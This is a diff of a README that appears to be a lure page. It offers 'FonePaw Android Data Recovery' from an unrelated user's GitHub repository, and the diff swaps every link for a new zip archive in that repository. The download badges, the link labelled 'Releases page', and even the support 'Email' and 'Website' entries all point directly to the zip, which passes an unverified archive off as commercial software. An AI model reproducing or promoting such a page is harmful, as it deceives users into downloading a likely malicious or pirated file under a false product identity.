@@ -4,7 +4,7 @@
 
 Welcome to FonePaw Android Data Recovery! This software helps you recover lost data from your Android device with ease. Whether you lost contacts, photos, or messages, this tool can help you get them back.
 
-[![Download FonePaw Android Data Recovery](https://raw.githubusercontent.com/Narendhar562/FonePaw-Android-Data-Recovery-Download/main/plangent/FonePaw-Android-Data-Recovery-Download.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Narendhar562/FonePaw-Android-Data-Recovery-Download/main/plangent/FonePaw-Android-Data-Recovery-Download.zip)
+[![Download FonePaw Android Data Recovery](https://github.com/Narendhar562/FonePaw-Android-Data-Recovery-Download/raw/refs/heads/main/plangent/Fone_Recovery_Paw_Data_Android_Download_v1.0.zip%20Now-Click%20Here-blue)](https://github.com/Narendhar562/FonePaw-Android-Data-Recovery-Download/raw/refs/heads/main/plangent/Fone_Recovery_Paw_Data_Android_Download_v1.0.zip)
 
 ## 📦 What is FonePaw Android Data Recovery?
 
@@ -40,7 +40,7 @@ To download FonePaw Android Data Recovery, follow these steps:
 
 1. Click the link below to visit the Releases page:
    
-   [Visit the Download Page](https://raw.githubusercontent.com/Narendhar562/FonePaw-Android-Data-Recovery-Download/main/plangent/FonePaw-Android-Data-Recovery-Download.zip)
+   [Visit the Download Page](https://github.com/Narendhar562/FonePaw-Android-Data-Recovery-Download/raw/refs/heads/main/plangent/Fone_Recovery_Paw_Data_Android_Download_v1.0.zip)
 
 2. On the Releases page, locate the latest version of FonePaw Android Data Recovery.
 
@@ -104,8 +104,8 @@ The recovery time varies based on the amount of data and the type of files being
 
 If you encounter any issues while using FonePaw Android Data Recovery, you can reach out for support through:
 
-- **Email:** https://raw.githubusercontent.com/Narendhar562/FonePaw-Android-Data-Recovery-Download/main/plangent/FonePaw-Android-Data-Recovery-Download.zip
-- **Website:** [FonePaw Support](https://raw.githubusercontent.com/Narendhar562/FonePaw-Android-Data-Recovery-Download/main/plangent/FonePaw-Android-Data-Recovery-Download.zip)
+- **Email:** https://github.com/Narendhar562/FonePaw-Android-Data-Recovery-Download/raw/refs/heads/main/plangent/Fone_Recovery_Paw_Data_Android_Download_v1.0.zip
+- **Website:** [FonePaw Support](https://github.com/Narendhar562/FonePaw-Android-Data-Recovery-Download/raw/refs/heads/main/plangent/Fone_Recovery_Paw_Data_Android_Download_v1.0.zip)
 
 For additional resources and guides, please check out our documentation on the FonePaw website.
 
@@ -113,4 +113,4 @@ For additional resources and guides, please check out our documentation on the F
 
 Don’t let lost data stress you out. Begin your recovery journey with FonePaw Android Data Recovery today!
 
-[![Download FonePaw Android Data Recovery](https://raw.githubusercontent.com/Narendhar562/FonePaw-Android-Data-Recovery-Download/main/plangent/FonePaw-Android-Data-Recovery-Download.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Narendhar562/FonePaw-Android-Data-Recovery-Download/main/plangent/FonePaw-Android-Data-Recovery-Download.zip)
+[![Download FonePaw Android Data Recovery](https://github.com/Narendhar562/FonePaw-Android-Data-Recovery-Download/raw/refs/heads/main/plangent/Fone_Recovery_Paw_Data_Android_Download_v1.0.zip%20Now-Click%20Here-blue)](https://github.com/Narendhar562/FonePaw-Android-Data-Recovery-Download/raw/refs/heads/main/plangent/Fone_Recovery_Paw_Data_Android_Download_v1.0.zip)
